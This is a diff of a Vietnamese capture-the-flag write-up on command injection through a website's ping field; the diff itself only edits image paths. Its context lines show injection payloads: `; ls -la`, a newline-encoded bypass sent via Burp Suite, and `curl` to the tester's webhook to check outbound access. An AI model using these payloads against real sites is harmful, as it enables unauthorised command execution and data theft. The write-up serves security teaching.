@@ -16,11 +16,11 @@
 
 **B1:** Đầu tiên, giao diện Website chỉ có 1 chức năng Ping duy nhất:
 
-![alt text](image.png)
+![alt text](./images/image.png)
 
 **B2:** Ta thử điền google.com vào thì Website trả về kết quả như sau:
 
-![alt text](image-1.png)
+![alt text](./images/image-1.png)
 
 Đến đây thì ta có thể hình dung Website sẽ lấy input ta nhập vào rồi thực hiện cú pháp ping đến input đó.
 
@@ -33,7 +33,7 @@
 * <u>**Giải thích:**</u> google.com là để kết hợp với lệnh ping của hệ thống, sau đó ta sẽ thêm `; ls -la` để thử xem liệu Website có thực thi câu lệnh được kéo dài này của ta không ?
 * Nếu như giả thuyết của ta đúng thì cú pháp của hệ thống lúc này sẽ như sau: `ping google.com; ls -la`
 
-![alt text](image-2.png)
+![alt text](./images/image-2.png)
 
 => Xem ra Website đã filter input người dùng để hạn chế việc bị tấn công Command Injection.
 
@@ -43,7 +43,7 @@ Nhưng ngoài dấu `;` để nối dài câu lệnh Command trong Linux thì ta
 
 **Lưu ý:** Payload trên phải được chỉnh sửa qua gói tin trên Burp-suite vì khi thực hiện thẳng trên trình duyệt có thể sẽ không thành công.
 
-![alt text](image-3.png)
+![alt text](./images/image-3.png)
 
 => Từ đây, ta có thể kết luận trang web đã thực thi Command của ta.
 
@@ -53,7 +53,7 @@ Tuy nhiên, kết quả trả về lại chỉ là `Ping OK`. Vậy thì làm sa
 
 **B5:** Ta thử sử dụng lệnh `curl https://webhook_cua_ta` để xem thử Website có cho gói tin ra ngoài không thông qua payload `google.com%0acurl+https://webhook_cua_ta`
 
-![alt text](image-4.png)
+![alt text](./images/image-4.png)
 
 => Vậy là ta có thể `curl` đến Webhook của ta.
 
